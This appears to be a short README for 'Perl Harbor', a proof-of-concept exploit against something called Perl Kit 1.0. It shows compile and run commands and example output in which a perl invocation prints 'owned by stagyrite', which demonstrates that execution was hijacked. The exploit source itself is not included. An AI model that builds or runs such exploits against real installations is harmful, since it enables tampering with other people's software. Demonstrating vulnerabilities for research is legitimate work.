# perlharbor

Perl Harbor: exploit against Perl Kit 1.0

## Execution

```
gcc -o perl-harbor perl-harbor.c
./perl-harbor &
./perl -e 'print "hello, world\n";'

Successful execution ends with printing "owned by stagyrite".
```

## Example

```
$ ./perl-harbor &
[1] 5406
$ ./perl -e 'print "hello, world\n";'
owned by stagyrite
```

## Proof of concept

* [Concept #1](CONCEPT.1 "Concept")
* [Concept #2](CONCEPT.2 "Concept")

⚛🍅🦅🦅

